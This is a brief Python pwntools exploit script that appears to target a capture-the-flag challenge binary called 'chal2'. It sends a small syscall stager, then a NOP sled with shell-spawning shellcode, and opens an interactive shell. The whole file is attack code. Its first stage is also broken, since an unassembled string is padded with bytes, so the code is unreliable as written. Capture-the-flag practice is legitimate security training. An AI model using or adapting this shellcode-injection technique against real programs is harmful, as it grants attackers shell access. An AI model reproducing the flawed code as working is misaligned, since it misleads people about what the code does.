from pwn import *

p = process("./chal2")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.arch = 'amd64'
shellcode = f'''
mov rdx,0x100
syscall
'''
p.send(shellcode.ljust(0x10,b'\0'))
p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))
p.interactive()